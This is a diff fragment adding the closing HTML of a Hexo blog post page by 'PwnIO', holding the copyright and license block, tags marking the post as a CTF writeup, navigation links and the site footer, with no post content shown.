+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>PwnIO</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://pwnio.com/2023/75ef5042d1bd.html">http://pwnio.com/2023/75ef5042d1bd.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Tech/"># Tech</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/86fed7cb4d95.html">用脑洞方法解决力扣1106解析布尔表达式</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© PwnIO | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
